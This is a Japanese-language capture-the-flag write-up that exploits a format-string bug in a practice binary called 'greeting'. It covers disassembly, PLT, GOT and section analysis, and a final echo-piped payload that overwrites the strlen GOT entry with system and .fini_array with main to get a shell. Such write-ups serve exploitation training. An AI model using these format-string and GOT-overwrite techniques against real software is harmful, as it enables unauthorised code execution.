# greeting

## 実行
```
./greeting
```

で実行。Naoさんが自己紹介してくれ、名前の入力を求められる。

```
Hello, I'm nao!
Please tell me your name...
```

適当に入力すると、挨拶を返してくれる。

```
Please tell me your name... yyamada
Nice to meet you, yyamada :)
```

条件反射で、%xを入れてみると、数値に置換されているので、書式文字列攻撃が使えそう。

```
Hello, I'm nao!
Please tell me your name... AAAA%x%x%x%x
Nice to meet you, AAAA80487d0bfcab77c00 :)
```

入力した文字列が何バイト目に格納されるかチェックすると、
11バイト目の後半からであった。
先頭に2文字入れてから`AAAA`を入力して12バイト目をチェックすれば`41414141`が確認できる

```
Hello, I'm nao!
Please tell me your name... aaAAAA,%12$x
Nice to meet you, aaAAAA,41414141 :)
```

## gdbで`run`するとすぐに止まる

どうやらデバッガは、今動いているプロセスを追うので、子プロセスを作成されると止まってしまうようだ。
こういう場合は、`set follow-fork-mode parent`というコマンドで対応できる。


## checksec

```
checksec --file greeting
```

結果は以下。NoRELROなのでGOT Overwriteが使える。

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   greeting
```


## プログラムのチェック

printf -> getnline -> sprintf -> printf(FSA可能箇所) ->という流れ。
FSAした後に関数が呼ばれていないため困るが、デストラクタが呼ばれることに気づけば、
デストラクタを書き換えてメインに戻ればよい。
二度目のユーザ入力で`"bash/sh"`を与えて、それを引数にsystem関数を呼べればベスト。

```
   0x080485ed <+0>:	push   ebp
   0x080485ee <+1>:	mov    ebp,esp
=> 0x080485f0 <+3>:	and    esp,0xfffffff0
   0x080485f3 <+6>:	sub    esp,0xa0
   0x080485f9 <+12>:	mov    eax,gs:0x14
   0x080485ff <+18>:	mov    DWORD PTR [esp+0x9c],eax
   0x08048606 <+25>:	xor    eax,eax
   0x08048608 <+27>:	mov    DWORD PTR [esp],0x80487b3
   0x0804860f <+34>:	call   0x8048450 <printf@plt>
   0x08048614 <+39>:	mov    DWORD PTR [esp+0x4],0x40
   0x0804861c <+47>:	lea    eax,[esp+0x5c]
   0x08048620 <+51>:	mov    DWORD PTR [esp],eax
   0x08048623 <+54>:	call   0x8048679 <getnline>
   0x08048628 <+59>:	test   eax,eax
   0x0804862a <+61>:	je     0x8048656 <main+105>
   0x0804862c <+63>:	lea    eax,[esp+0x5c]
   0x08048630 <+67>:	mov    DWORD PTR [esp+0x8],eax
   0x08048634 <+71>:	mov    DWORD PTR [esp+0x4],0x80487d0
   0x0804863c <+79>:	lea    eax,[esp+0x1c]
   0x08048640 <+83>:	mov    DWORD PTR [esp],eax
   0x08048643 <+86>:	call   0x80484e0 <sprintf@plt>
   0x08048648 <+91>:	lea    eax,[esp+0x1c]
   0x0804864c <+95>:	mov    DWORD PTR [esp],eax
   0x0804864f <+98>:	call   0x8048450 <printf@plt>
   0x08048654 <+103>:	jmp    0x8048662 <main+117>
   0x08048656 <+105>:	mov    DWORD PTR [esp],0x80487e9
   0x0804865d <+112>:	call   0x8048480 <puts@plt>
   0x08048662 <+117>:	mov    edx,DWORD PTR [esp+0x9c]
   0x08048669 <+124>:	xor    edx,DWORD PTR gs:0x14
   0x08048670 <+131>:	je     0x8048677 <main+138>
   0x08048672 <+133>:	call   0x8048470 <__stack_chk_fail@plt>
   0x08048677 <+138>:	leave
   0x08048678 <+139>:	ret
```

getnlineを見ると、fgets -> strchr -> strlen という流れ。

strlenで入力した内容を引数に取っているので、
ここをsystemにすれば、`"bash/sh"`を入力することで引数にしてsystemに飛ばすことができそう。

```
Dump of assembler code for function getnline:
   0x08048679 <+0>:	push   ebp
   0x0804867a <+1>:	mov    ebp,esp
=> 0x0804867c <+3>:	sub    esp,0x28
   0x0804867f <+6>:	mov    eax,ds:0x8049a80
   0x08048684 <+11>:	mov    DWORD PTR [esp+0x8],eax
   0x08048688 <+15>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804868b <+18>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868f <+22>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048692 <+25>:	mov    DWORD PTR [esp],eax
   0x08048695 <+28>:	call   0x8048460 <fgets@plt>
   0x0804869a <+33>:	mov    DWORD PTR [esp+0x4],0xa
   0x080486a2 <+41>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486a5 <+44>:	mov    DWORD PTR [esp],eax
   0x080486a8 <+47>:	call   0x80484b0 <strchr@plt>
   0x080486ad <+52>:	mov    DWORD PTR [ebp-0xc],eax
   0x080486b0 <+55>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080486b4 <+59>:	je     0x80486bc <getnline+67>
   0x080486b6 <+61>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486b9 <+64>:	mov    BYTE PTR [eax],0x0
   0x080486bc <+67>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486bf <+70>:	mov    DWORD PTR [esp],eax
   0x080486c2 <+73>:	call   0x80484c0 <strlen@plt>
   0x080486c7 <+78>:	leave
   0x080486c8 <+79>:	ret
```

作戦をまとめると、
FSKでデストラクタのアドレスをメイン関数のアドレスに書き換え　＆　strlenのアドレスをsystemに書き換え
-> 二度目のメイン関数で、"bash/sh"と入力してshellを起動

## pltのチェック
```
objdump -d -M intel -j .plt --no greeting
```

pltを見てみる。
systemがpltにあるので、`08048490`にEIPを飛ばせば呼び出せる。
また、strlenのアドレスが`08049a54`に格納されていることが分かるので、ここを`08048490`に書き換えることでsystemに飛ばせる。

```
Disassembly of section .plt:

08048430 <.plt>:
 8048430:	push   DWORD PTR ds:0x8049a2c
 8048436:	jmp    DWORD PTR ds:0x8049a30
 804843c:	add    BYTE PTR [eax],al
	...

08048440 <setbuf@plt>:
 8048440:	jmp    DWORD PTR ds:0x8049a34
 8048446:	push   0x0
 804844b:	jmp    8048430 <.plt>

08048450 <printf@plt>:
 8048450:	jmp    DWORD PTR ds:0x8049a38
 8048456:	push   0x8
 804845b:	jmp    8048430 <.plt>

08048460 <fgets@plt>:
 8048460:	jmp    DWORD PTR ds:0x8049a3c
 8048466:	push   0x10
 804846b:	jmp    8048430 <.plt>

08048470 <__stack_chk_fail@plt>:
 8048470:	jmp    DWORD PTR ds:0x8049a40
 8048476:	push   0x18
 804847b:	jmp    8048430 <.plt>

08048480 <puts@plt>:
 8048480:	jmp    DWORD PTR ds:0x8049a44
 8048486:	push   0x20
 804848b:	jmp    8048430 <.plt>

08048490 <system@plt>:
 8048490:	jmp    DWORD PTR ds:0x8049a48
 8048496:	push   0x28
 804849b:	jmp    8048430 <.plt>

080484a0 <__gmon_start__@plt>:
 80484a0:	jmp    DWORD PTR ds:0x8049a4c
 80484a6:	push   0x30
 80484ab:	jmp    8048430 <.plt>

080484b0 <strchr@plt>:
 80484b0:	jmp    DWORD PTR ds:0x8049a50
 80484b6:	push   0x38
 80484bb:	jmp    8048430 <.plt>

080484c0 <strlen@plt>:
 80484c0:	jmp    DWORD PTR ds:0x8049a54
 80484c6:	push   0x40
 80484cb:	jmp    8048430 <.plt>

080484d0 <__libc_start_main@plt>:
 80484d0:	jmp    DWORD PTR ds:0x8049a58
 80484d6:	push   0x48
 80484db:	jmp    8048430 <.plt>

080484e0 <sprintf@plt>:
 80484e0:	jmp    DWORD PTR ds:0x8049a5c
 80484e6:	push   0x50
 80484eb:	jmp    8048430 <.plt>
```

## GOTのチェック

```
readelf -r greeting
```

ここでも、strlenのアドレスがどこに格納されているかがわかる。

```
Relocation section '.rel.dyn' at offset 0x394 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049a24  00000706 R_386_GLOB_DAT    00000000   __gmon_start__
08049a80  00000e05 R_386_COPY        08049a80   stdin@GLIBC_2.0
08049aa0  00000c05 R_386_COPY        08049aa0   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x3ac contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049a34  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
08049a38  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
08049a3c  00000307 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
08049a40  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
08049a44  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
08049a48  00000607 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
08049a4c  00000707 R_386_JUMP_SLOT   00000000   __gmon_start__
08049a50  00000807 R_386_JUMP_SLOT   00000000   strchr@GLIBC_2.0
08049a54  00000907 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
08049a58  00000a07 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
08049a5c  00000b07 R_386_JUMP_SLOT   00000000   sprintf@GLIBC_2.0
```

## デストラクタ
`readelf -S greeting`でデストラクタが見れるらしい


```
Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481b8 0001b8 0000f0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482a8 0002a8 00009c 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048344 000344 00001e 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048364 000364 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048394 000394 000018 08   A  5   0  4
  [10] .rel.plt          REL             080483ac 0003ac 000058 08   A  5  12  4
  [11] .init             PROGBITS        08048404 000404 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048430 000430 0000c0 04  AX  0   0 16
  [13] .text             PROGBITS        080484f0 0004f0 000252 00  AX  0   0 16
  [14] tomori            PROGBITS        08048742 000742 00003e 00  AX  0   0  1
  [15] .fini             PROGBITS        08048780 000780 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048794 000794 000069 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048800 000800 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        0804883c 00083c 0000f0 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      0804992c 00092c 000008 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049934 000934 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049938 000938 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         0804993c 00093c 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049a24 000a24 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        08049a28 000a28 000038 04  WA  0   0  4
  [25] .data             PROGBITS        08049a60 000a60 000008 00  WA  0   0  4
  [26] .bss              NOBITS          08049a80 000a68 000028 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 000a68 00004d 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 000ab5 00010d 00      0   0  1
  [29] .symtab           SYMTAB          00000000 00109c 000500 10     30  46  4
  [30] .strtab           STRTAB          00000000 00159c 00031d 00      0   0  1
```

`.fini_array`がデストラクタらしいので、デストラクタのアドレスを格納しているのアドレスは`08049934`である。

つまり、`*08049934 = (デストラクタのアドレス)`であり、
`*08049934 = (main関数のアドレス)`に書き換えれば、メイン関数を再度呼び出せる。

```
.fini_array       FINI_ARRAY      08049934
```


## 解法

```
echo -e 'aa\x56\x9a\x04\x08\x54\x9a\x04\x08\x34\x99\x04\x08%2020x%12$hn%31884x%13$hn%349x%14$hn\nsh\nls' | ./greeting
```

すればよい
初めの`\x56\x9a\x04\x08`と`\x54\x9a\x04\x08`がstrlenの書き換えるアドレス`08049a54`の２バイトずつを表し、その次の`\x34\x99\x04\x08`がデストラクタの書き換えるアドレスを指す。

そこから、
strlenは`08048490`に書き換えるので、
`Nice to meet you, `の18バイト、`aa`の2バイト、アドレス * 3の12バイトの合計32を考慮して
0804 -> 0x0804 - 32 = 2020
8490 -> 0x8490 - 0x0804 = 31884
そしてデストラクタのアドレスをメインのアドレス`080485ed`に書き換えるので、下位2バイトに注目して、
85ed -> 0x85ed - 0x8490 = 349

となる。

デストラクタが下位2バイトでよくてstrlenは4バイト全て書き換える必要があるところは謎。
どっちも書き換える前は上位2バイトは`0804`なのでは、、？

strlenを2バイトだけ書き換える以下のコマンドではうまくいかなかった。

```
echo -e 'aa\x54\x9a\x04\x08\x34\x99\x04\x08%33908%12$hn%349x%13$hn\nsh\nls' | ./greeting
```